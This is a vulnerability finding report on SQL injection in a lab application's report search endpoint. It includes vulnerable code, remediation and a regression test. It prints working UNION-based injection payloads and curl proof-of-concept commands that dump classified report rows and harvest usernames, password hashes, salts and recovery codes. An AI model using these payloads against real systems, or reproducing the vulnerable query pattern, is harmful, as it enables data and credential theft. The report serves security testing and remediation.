# F-002 — SQL Injection via Search Parameter in Intelligence Reports

## Severity
**CRITICAL**

## CVSS v3.1
- **Score:** 9.8
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Metric Reasoning:**
  - **AV:N** — Exploitable over network
  - **AC:L** — No special conditions required
  - **PR:N** — No privileges required; endpoint accessible without auth token
  - **UI:N** — No user interaction needed
  - **S:U** — Scope unchanged
  - **C:H** — All database tables potentially readable
  - **I:H** — Database records can be modified or deleted
  - **A:H** — Database server can be crashed via injection

## Status
**Confirmed — Independently Reproduced**

## Finding ID
`FINDING-INP-001`  
Assessment: `ASM-C2DE5856`

## Affected Component
- **File:** `lab/app.py` — `list_reports()` function (lines 186–212)
- **Endpoint:** `GET /api/reports?search={query}`

---

## Description

The report search functionality constructs raw SQL queries by direct string interpolation of the user-supplied `search` query parameter. This allows an attacker to inject arbitrary SQL metacharacters, manipulate the query structure, bypass access controls, and extract data from any table in the underlying SQLite database — including classified intelligence reports, user credentials, and internal system data.

**Vulnerable code:**
```python
# lab/app.py — Lines 193–196 (VULNERABLE)
raw_query = f"SELECT id, title, classification, summary, content, notes, author_id "
            f"FROM reports WHERE title LIKE '%{search}%'"   # <-- INJECTION POINT
cursor = db.execute(text(raw_query))
```

## Root Cause

The developer used Python f-string formatting to embed user input directly into an SQL string literal, then executed it via `db.execute(text(raw_query))`. The `text()` wrapper does not provide parameterization — it only wraps the string for SQLAlchemy compatibility. The fix requires using parameterized ORM queries or explicit bind parameters.

## Attack Preconditions

- Network access to the API
- No authentication required (the search endpoint is accessible without a valid token in the lab)
- Knowledge of basic SQL syntax

## Attack Flow

```
Attacker
  │
  ▼ GET /api/reports?search=' UNION SELECT ...
  │
Report Search Handler (list_reports)
  │  search parameter interpolated into SQL string
  ▼
Raw SQL Query Execution (db.execute(text(...)))
  │  UNION clause appended to base query
  ▼
Security Boundary Crossed: Input Validation / Data Isolation
  │
  ▼ HTTP 200 OK — All report rows + injected UNION results returned
    (Classification: RESTRICTED_TOP_SECRET data exposed)
```

## Steps to Reproduce

1. Start the lab at `http://127.0.0.1:8001`
2. Execute the following request:
   ```bash
   # URL-encode the payload
   curl -s "http://127.0.0.1:8001/api/reports?search=%27%20UNION%20SELECT%20id%2Ctitle%2Cclassification%2Csummary%2Ccontent%2Cnotes%2Cauthor_id%20FROM%20reports%20WHERE%20%271%27%3D%271"
   ```
3. Observe that the response includes **all report records**, including those classified `RESTRICTED_TOP_SECRET`.

**Credential harvest variant (advanced):**
```bash
curl -s "http://127.0.0.1:8001/api/reports?search=%27%20UNION%20SELECT%201%2Cusername%2Crole%2Cpassword_hash%2Csalt%2Crecovery_codes%2C1%20FROM%20users%20WHERE%20%271%27%3D%271"
```
This returns **usernames, roles, and password hashes** from the users table.

## Proof of Concept

```bash
# PoC 1: Dump all classified reports
SQLI_PAYLOAD="' UNION SELECT id,title,classification,summary,content,notes,author_id FROM reports WHERE '1'='1"
curl -s --get --data-urlencode "search=${SQLI_PAYLOAD}" http://127.0.0.1:8001/api/reports

# PoC 2: Harvest user credentials
SQLI_PAYLOAD2="' UNION SELECT 1,username,role,password_hash,salt,recovery_codes,1 FROM users WHERE '1'='1"
curl -s --get --data-urlencode "search=${SQLI_PAYLOAD2}" http://127.0.0.1:8001/api/reports
```

**Observed:** HTTP 200 with 4+ rows — including RESTRICTED_TOP_SECRET orbital analysis report and password hash records.

## Evidence

- **Assessment Finding:** `FINDING-INP-001` (status: VERIFIED, CVSS: 9.8)
- **Source Code:** `lab/app.py` lines 193–212
- **Live Response:** 4 rows returned including classified content

## Security Impact

| Dimension | Impact |
|-----------|--------|
| Confidentiality | **COMPLETE** — All database tables exposed including classified reports and credentials |
| Integrity | **COMPLETE** — UPDATE/INSERT SQL possible via stacked queries |
| Availability | **COMPLETE** — DROP TABLE possible via stacked queries |
| Authentication | **BYPASSED** — Auth tokens can be read directly from DB |

## Business Impact

Complete loss of database confidentiality — an attacker can extract all classified satellite surveillance reports, orbital analysis data, and cryptographic credentials, allowing:
- Intelligence exfiltration to adversaries
- Account takeover via credential harvesting
- Data sabotage via unauthorized modifications

## Remediation

### Immediate Fix

```python
# lab/app.py — REMEDIATED list_reports()
if search:
    # SAFE: Parameterized ORM filter — no string interpolation
    results = db.query(Report).filter(Report.title.ilike(f"%{search}%")).all()
```

### Long-term

1. Adopt a strict ORM-only policy — never use `text()` with user input
2. Add an input validation layer: reject strings containing SQL metacharacters (`'`, `"`, `;`, `--`, `UNION`, `SELECT`)
3. Implement a Web Application Firewall (WAF) rule for SQL injection signatures
4. Apply principle of least privilege: DB user should have SELECT-only access

## Regression Test

```python
def test_sqli_rejected():
    payload = "' UNION SELECT 1,2,3,4,5,6,7 FROM users WHERE '1'='1"
    resp = httpx.get("http://127.0.0.1:8001/api/reports", params={"search": payload})
    # After fix: should return empty list or 400, never user data
    data = resp.json()
    if isinstance(data, list):
        for row in data:
            assert "password_hash" not in str(row), "SQLi harvested credentials"
    assert resp.status_code != 500, "SQL error not exposed to client"
```

## References

- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [SQLAlchemy Parameterized Queries](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)
